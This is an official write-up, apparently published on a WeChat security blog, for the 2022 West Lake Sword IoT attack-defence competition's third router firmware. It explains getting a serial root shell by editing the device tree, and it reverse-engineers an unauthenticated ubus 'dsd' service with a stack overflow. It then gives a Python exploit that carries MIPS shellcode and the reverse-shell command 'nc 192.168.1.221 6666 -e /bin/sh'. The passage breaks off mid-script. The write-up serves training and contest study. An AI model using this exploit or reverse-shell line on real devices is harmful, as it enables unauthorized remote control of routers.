---
title: 2022西湖论剑 IoT-AWD 赛题官方 WriteUp （下篇）：三号固件
url: https://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247493817&idx=1&sn=3fc9e016df8c42e204782603be5fbac4&chksm=f9ed8406ce9a0d106ec8126f8edb451659a5096f877b968716cb5428eabb8f18feb5ab58d7e9&scene=58&subscene=0#rd
source: 网络安全研究宅基地
date: 2023-03-29
fetch_date: 2025-10-04T11:01:13.528848
---

# 2022西湖论剑 IoT-AWD 赛题官方 WriteUp （下篇）：三号固件

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/AvAjnOiazvneoSyIFj3XyXD6xjx04LGR0miarlcLlbJkbibf9f7dRQOLoAshPRGNxoN3WH9fT23HSia8IzjffSwh2g/0?wx_fmt=jpeg)

# 2022西湖论剑 IoT-AWD 赛题官方 WriteUp （下篇）：三号固件

海特实验室

网络安全研究宅基地

**点击蓝字 关注我们**

本届西湖论剑比赛延续了在IoT真实硬件设备上进行解题的竞赛风格，采用了 AWD 攻防赛模式，比赛期间为每个参赛队伍提供一个海特开源路由设备（HatLab Gateboard-One）作为靶标环境。该设备预设若干系统漏洞，参赛队伍可利用不同漏洞对其他队伍得设备发起攻击以获得分数，同时对该设备进行加固防护，避免被其他参赛队伍攻击成功而丢失分数。

比赛提供了四份固件（其中一份是备份固件，比赛时暂未放出），每个固件提供了若干道赛题，下面是各个固件的赛题WriteUp。本文为下篇：三号固件详解。

上篇请点击：[《2022西湖论剑 IoT-AWD 赛题官方 WriteUp （上篇）：一号固件&二号固件》](http://mp.weixin.qq.com/s?__biz=MzUyMDEyNTkwNA==&mid=2247493801&idx=1&sn=d3f98938ae8df76c28accc580a4e6c17&chksm=f9ed8416ce9a0d00c54d8ab9749e7d76792b82b06780ae103b3879c154b80654e0c4ef3c1881&scene=21#wechat_redirect)

**三号固件**

***3***

**root shell获取和默认密码重置**

查看设备的启动日志可以知道启动参数中console=ttyS0

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybCeScRQdgfmluTIwCNg3CptRD5d2RPFtO1thCWeaNXxUkPNSicLhX60A/640?wx_fmt=png)

将串口终端最后打印的信息和第一套固件同样位置的信息作对比可以发现ttyS0所对应的uart串口地址已经从0x1e000c00变成了0x1e000d00，uartlite设备消失。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybibRh2eicKfmYbmibt4TNFtvHN8rqicoMW33Kxibfe94IYWVZbkl0cbRPpAQ/640?wx_fmt=png)

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybsy4MkD2nG7KDXn54Pby2gUsW223Sr4PgXCRNEZlFedW2QCv53HicvLQ/640?wx_fmt=png)

可以通过dumpimg工具将提供的itb解包出设备树，具体方法可以看2021西湖论剑IOT的wp。查看解包后的设备树文件可以发现uartlite处的状态设置为disabled。删除该行或将状态改为okay后用mkimage重新打包成itb刷入设备即可获得串口root权限。

uartlite@c00 {

    compatible = "ns16550a";

    reg = <0xc00 0x100>;

    clock-frequency = <0x2faf080>;

    interrupt-parent = <0x01>;

    interrupts = <0x00 0x1a 0x04>;

    reg-shift = <0x02>;

    reg-io-width = <0x04>;

    no-loopback-test;

    status ="disabled";

};

uartlite2@d00 {

    compatible = "ns16550a";

    reg = <0xd00 0x100>;

    clock-frequency = <0x2faf080>;

    interrupt-parent = <0x01>;

    interrupts = <0x00 0x1b 0x04>;

    reg-shift = <0x02>;

    reg-io-width = <0x04>;

    pinctrl-names = "default";

    pinctrl-0 = <0x06>;

    status = "okay";

};

uartlite3@e00 {

    compatible = "ns16550a";

    reg = <0xe00 0x100>;

    clock-frequency = <0x2faf080>;

    interrupt-parent = <0x01>;

    interrupts = <0x00 0x1c 0x04>;

    reg-shift = <0x02>;

    reg-io-width = <0x04>;

    pinctrl-names = "default";

    pinctrl-0 = <0x07>;

    status = "okay";

};

默认密码修改同第二题。

**dsd**

通过逆向分析dsd程序，发现里面有ubus\_connect函数，猜测与openwrt ubus有关。

在获取到设备shell之后可以用 ubus list 查看注册的类，发现dsd类，再用ubus -v list dsd 查看dsd类注册的方法和消息格式。或者逆向分析dsd程序，分析出方法和消息格式。

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybGicCdzoLcIwLDIHsibOBXEhFRNdtr8YjQah3JpGMxAOM4ibkFH2LZ8Kibw/640?wx_fmt=png)

可以用ubus call dsd job '{"msg":"aaa"}' 测试下返回，方便下面的逆向分析

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybUSPnYQrWficbQO0oEiaEMmFp1k0oibYdbJowJ77rFGzTVUv96SP4AwqxQ/640?wx_fmt=png)

我们都知道可以利用 uhttpd 的模块 和 rpcd 还可以实现通过 http 来访问 ubus 总线，通过分析rpcd的acl的配置文件，我们可以得知dsd job 和 session login 一样都是不需要认证的，可以通过 http 直接访问到

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybrdLlxCaRC9jNwicCabsSLsuVXv4Rq5kFcfyelGv6EVD0pibf1ibVhBLWA/640?wx_fmt=png)

或者可以用 ubus call session list 查看不需要认证的消息中有 dsd job

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3yb9QzF4icIFUxujNNv1XRa9OMrkUwoc94fZLaugk2tGAKP6ObdzUx3JWw/640?wx_fmt=png)

然后可以通过抓web界面的包，看出uhttpd传递给ubus具体消息格式，结合openwrt的ubus文档https://openwrt.org/zh/docs/techref/ubus

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybWa0pITbp2qzlohZYLiajX5ib6mgzPUWQK9D0AzMnXApKV0mNb50rFNqg/640?wx_fmt=png)

很容易得出uhttp调用ubus call dsd job 的完整消息格式

![](https://mmbiz.qpic.cn/mmbiz_png/AvAjnOiazvncCG7mLLRBS7micV7kJ4n3ybXrPM0dly8w5ma7DqcX7SMkumOWiarETMeDGDiadjy5oj4hUTTxulbmDw/640?wx_fmt=png)

逆向分析找到dsd程序job方法的主逻辑，下面的"status"和"msg"字段与 ubus call dsd job的 response中的相互对应。可以判断出v8就是我们传入的"msg"

int \_\_fastcall sub\_4012F4(int a1, int a2, int a3, int a4, \_DWORD \*a5)

{

    int v5; // $s0

    int v6; // $v0

    const char \*v8; // [sp+20h] [+20h]

    char v9[4]; // [sp+24h] [+24h] BYREF

    int v10; // [sp+28h] [+28h]

    char v11[28]; // [sp+2Ch] [+2Ch] BYREF

    strcpy(v11, "%s received a message: %s");

    v8 = "(unknown)";

    v5 = sub\_400AA0((int)a5);

    v6 = sub\_400B1C(a5);

    blobmsg\_parse(&off\_4016FC, 2, v9, v5, v6);

    if ( v10 )

      v8 = (const char \*)sub\_400C74(v10);

    blob\_buf\_init(&dword\_4120E8, 0);

    sub\_401024((int)v8);

    sub\_400D20((int)&dword\_4120E8, (int)"status", 0);

    sub\_400DD0(&dword\_4120E8, "msg", v8);

    ubus\_send\_reply(a1, a3, dword\_4120E8);

    return 0;

}

其中sub\_401024函数为处理 msg字符串主逻辑，其中会判断里面是否有\*##\*字符，然后会进入sub\_400F80函数，里面strncpy没有判断size的大小就进行了拷贝，产生了栈溢出

void \_\_fastcall sub\_401024(int a1)

{

  char \*v1; // [sp+18h] [+18h]

  signed int v2; // [sp+28h] [+28h]

  signed int v3; // [sp+30h] [+30h]

  char \*v4; // [sp+34h] [+34h]

  int v5[16385]; // [sp+3Ch] [+3Ch] BYREF

  if ( a1 )

  {

    v1 = strstr((const char \*)a1, "action=");

    if ( v1 )

    {

      if ( strstr(v1 + 7, "ping\_test") )

      {

        sub\_400DD0(&dword\_4120E8, "action", "ping\_test");

        sub\_400EB0("www.baidu.com");

      }

    }

    else

    {

      v2 = \*(char \*)(a1 + 5) + (\*(char \*)(a1 + 4) << 8);

      v3 = (\*(char \*)(a1 + 6) << 8) + \*(char \*)(a1 + 7);

      if ( v3 < v2 - 7 && v3 < 0x10000 && v2 < 0x10000 )

      {

        memset(v5, 0, 0xFFFFu);

        memcpy(v5, (const void \*)(a1 + 8), v2);

        v4 = strstr((const char \*)v5, "\*##\*");

        if ( v4 )

        {

          if ( v4[4] )

            sub\_400F80(v4 + 4, v3);

          sub\_400DD0(&dword\_4120E8, "job", "down");

        }

      }

    }

  }

  \_\_asm { jr      $ra }

}

int \_\_fastcall sub\_400F80(const char \*a1, size\_t a2)

{

  char v4[4100]; // [sp+1Ch] [+1Ch] BYREF

  memset(v4, 0, 0x1000u);

  if ( a1 )

    strncpy(v4, a1, a2);

  sub\_400DD0(&dword\_4120E8, "good", "job");

  return 0;

}

strncpy 函数拷贝的时候有截断，所以我们的payload里面不可以有\x00, 由于三号固件的aslr等级为1，heap地址不会变化，通过gdb调试可知输入的"msg"会存放到heap上和stack上。

所以可提供的一种截断栈溢出利用思路为： heap上放编码优化过的无\x00 的mipsel shellcode , 然后劫持PC到heap地址上执行。

可提供一种很简单的shellcode思路，只需要8个字节。利用dsd 程序里面的0x400EEC地址jal system,然后再通过调整偏移来设置$a0

size\_t sub\_4083B0()

{

  char v1[28]; // [sp+18h] [+18h] BYREF

  char v2[68]; // [sp+34h] [+34h] BYREF

  sub\_403D98("type", v1, 20);

  sub\_403D98("param", v2, 64);

  if ( filter(v2) )

    return fwrite("

wrong parameter

\n", 1u, 0x17u, dword\_419154);

  if ( !strncmp(v1, "ping", 4u) )

  {

    exec\_ping(v2);

  }

  else if ( !strncmp(v1, "curl", 4u) )

  {

    exec\_curl(v2);

  }

  return fwrite("done\n", 1u, 5u, dword\_419154);

}

shellcode = asm("jal 0x400EEC", arch='mips', os='linux', bits=32)

shellcode += asm("addiu $a0, $sp, 0x1004", arch='mips', os='linux', bits=32)

print(shellcode)

shellcode = "\xbb\x03\x10\x0c\x04\x10\xa4\x27"

完整exp如下

import requests

from pwn import \*

import sys

context.arch = 'mips'

context.endian = 'little'

command = "nc 192.168.1.221 6666 -e /bin/sh;"

print("Command is :" + command)

// shellcode = asm("jal 0x400EEC", arch='mips', os='linux', bits=32)

// shellcode += asm("addiu $a0, $sp, 0x1004", arch='mips', os='linux', bits=32)

// print(shellcode)

shellcode = "\xbb\x03\x10\x0c\x04\x10\xa4\x27"

rawBody = "{\"jsonrpc\":\"2.0\",\"id\":\"0\",\"method\":\"call\",\r\n\"params\":[\"00000000000000000000000000000000\",\"dsd\",\"job\",{\"msg\":\"aaaa\x21\x21\x20\x10\*##\*" + shellcode + cyclic(

    4028, alphabet=string.ascii\_uppercase) + command + cyclic(4104-len(shellcode)-4028-len(command), alphabet=string.ascii\_uppercase) + "\x58\x30\x41" + "\"}]\r\n}"

session = requests.Session()

IP = sys.argv[1]

headers = {"Accept": "\*/\*", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.121 Safari/537.36",

           "Connection": "close", "Accept-Encoding": "gzip, d...